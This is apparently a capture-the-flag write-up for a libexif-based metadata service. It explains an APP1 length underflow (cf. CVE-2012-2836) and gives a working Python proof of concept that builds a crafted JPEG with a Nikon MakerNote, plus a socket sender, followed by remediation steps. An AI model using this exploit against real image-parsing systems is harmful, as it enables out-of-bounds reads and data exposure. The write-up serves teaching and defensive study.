# VULN#001 — metadata service (libexif, <HOST>:<PORT>)

## Status

Solved. The service replies `status: confirmed` followed by the flag; the flag was handed to the user for manual submission and is redacted here: `CTF{REDACTED}`.

## Target

- **Service:** `<HOST>:7027` (raw TCP).
- **Description:** "metadata service — The exact source".
- **Provided source:** **libexif 0.6.24** tree (the service is built from this revision).

## Protocol

```
[4-byte big-endian = length N] + [N bytes: the file (JPEG)]
```

Possible replies (single line, except on success):

| Reply | Meaning |
|---|---|
| `status: not valid` | invalid JPEG (broken structure, no `FFD9`) |
| `status: no effect` | parsed fine, no out-of-bounds read |
| `status: insufficient` | OOB read refused by the validator |
| `status: rate limited, try again later` | throttling |
| `status: confirmed` + `FLAG: CTF{REDACTED}` | bug triggered, flag returned |

## The vulnerability

In `exif_data_load_data()`, the two validation checks performed right after reading the APP1 segment length have been **removed**:

```c
/* present upstream, missing in the provided tree */
if (len > ds) return;   /* APP1 length > available data */
if (len < 2)  return;   /* APP1 length too small     */
```

Without them, the following computation underflows:

```c
ds = len - 2;   /* len = 1 => ds = 0xFFFFFFFF, later capped to 0xfffe */
```

The *declared* EXIF block size therefore becomes much larger than the actual frame. The decisive detail: `interpret_maker_note(data, d, fullds)` receives the value **before** the cap (`0xFFFFFFFF`), not `ds`. The MakerNote parsers (Olympus, which handles the Nikon V2 flavour) then validate their internal offsets against this huge size and read past the buffer.

The service-side validator, for its part, compares offsets against `ds` (the declared size) rather than the real frame length: an offset that is "in bounds" for it is out of bounds for libexif.

## PoC

Minimal JPEG (ImageMagick) + APP1 declaring `len = 1` + a **Nikon V2** MakerNote whose internal offset is `4096` (larger than the real ~358-byte frame, smaller than `65534`).

```python
import struct, subprocess

J = subprocess.run(["convert", "-size", "8x8", "xc:blue", "jpg:-"],
                   capture_output=True).stdout

def frame(tiff):
    return J[:2] + b"\xff\xe1" + struct.pack(">H", 1) + b"Exif\x00\x00" + tiff + J[2:]

def mk(X):
    # Nikon V2 MakerNote: signature + 3 bytes + TIFF "II" + internal offset (LE32)
    blob = b"Nikon\x00\x02" + b"\x00\x00\x00" + b"II" + b"\x00\x00" + struct.pack("<I", X)
    ifd0    = struct.pack("<H", 1) + struct.pack("<HHI", 0x8769, 4, 1) + struct.pack("<I", 26) + struct.pack("<I", 0)
    exififd = struct.pack("<H", 1) + struct.pack("<HHI", 0x927c, 7, len(blob)) + struct.pack("<I", 44) + struct.pack("<I", 0)
    tiff = b"II*\x00" + struct.pack("<I", 8) + ifd0 + exififd
    tiff = tiff.ljust(44, b"\x00") + blob
    return frame(tiff)

for X in (4096, 32768, 65500):
    open(f"n_{X}.bin", "wb").write(mk(X))
    print("n", X, len(mk(X)))
```

Notes:

- `0x8769` = pointer to the Exif sub-IFD; `0x927c` = **MakerNote** tag (format 7 = undefined).
- `4096` triggers (`> frame`, `<= ds`); `65500` stays `insufficient` (validator bound).

## Sending

```python
import socket, time

HOST, PORT = "<HOST>", 7027

def query(path, tries=8, gap=25):
    data = open(path, "rb").read()
    msg = len(data).to_bytes(4, "big") + data
    for _ in range(tries):
        s = socket.create_connection((HOST, PORT), timeout=8)
        s.settimeout(6)
        s.sendall(msg)
        out = b""
        while True:
            try:
                c = s.recv(8192)
            except socket.timeout:
                break
            if not c:
                break
            out += c
        s.close()
        if b"rate limited" in out:
            time.sleep(gap)
            continue
        return out
    return None

print(query("n_4096.bin"))
```

## Result

```
status: confirmed
FLAG: CTF{REDACTED}
```

## Analogy

Picture a customs officer checking your luggage. You hand him a passport whose validity is declared as "1 page" when it should be rejected outright — instead he writes down "validity: essentially infinite" (an underflow). You have slipped an internal note into the passport (the Nikon V2 MakerNote) saying "go look at page 4096". The officer follows that pointer, even though it lies far outside the real passport, and lands on the classified document (the flag).

## Remediation

- Restore the two checks after reading the APP1 length:

```c
if (len > ds) return;
if (len < 2)  return;
```

- Validate internal offsets (MakerNote, sub-IFDs) against the **real buffer size**, never against the declared size.
- Pass the capped value (`ds`) — not `fullds` — to the MakerNote parsers.
- Fuzz/analyze under ASan/UBSan: the bug surfaces immediately (`heap-buffer-overflow` inside the Olympus parser).

## References

- CVE-2012-2836 (APP1 length underflow in libexif).
- La technique réutilisable est résumée dans ce writeup.
- Patched source: `challenges/vuln001/libexif/exif-data.c`; upstream reference: `challenges/vuln001/upstream/`.
